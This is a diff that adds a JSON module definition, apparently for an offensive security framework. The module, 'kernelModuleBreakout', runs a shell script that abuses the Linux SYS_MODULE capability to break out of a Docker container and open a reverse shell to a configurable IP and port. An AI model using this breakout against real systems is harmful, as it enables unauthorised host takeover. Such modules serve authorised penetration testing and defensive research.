@@ -1,0 +1,31 @@
+{
+  "base": {
+    "name": "kernelModuleBreakout",
+    "type": "standard",
+    "author": ["Yaniv Yakobovich"],
+    "credits": ["Nishant Sharma - https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd , @willrushi - https://github.com/stealthcopter/deepce, "],
+    "path": ["linux", "shell", "kernelModuleBreakout.json"],
+    "platform": "linux",
+    "arch": "x64",
+    "lang": "Shell",
+    "privilege": false,
+    "GoInterpreter": false,
+    "GoInterpreterProgress": false,
+    "LoadScriptFromPath": true,
+    "notes": "Commands are run with /bin/bash -c . Use quotes if you want to run multiple commands or shell features such as redirection or pipeline",
+    "remote": "",
+    "local": [],
+    "options": [
+      {"name": "ip", "value": "127.0.0.1", "required": true, "flag": "", "description": "ip for the reverse shell"},
+      {"name": "port", "value": "8000", "required": true, "flag": "", "description": "port for the reverse shell"}
+    ],
+    "description": "Abusing SYS_MODULE Capability to create reverse shell with the host",
+    "commands": [
+      "data/modules/sourcecode/sh/kernelModuleBreakout/kernelModuleBreakout.sh",
+      "sh",
+      "-c",
+      "\"{{ip}} {{port}}\""
+    ]
+  }
+}
+
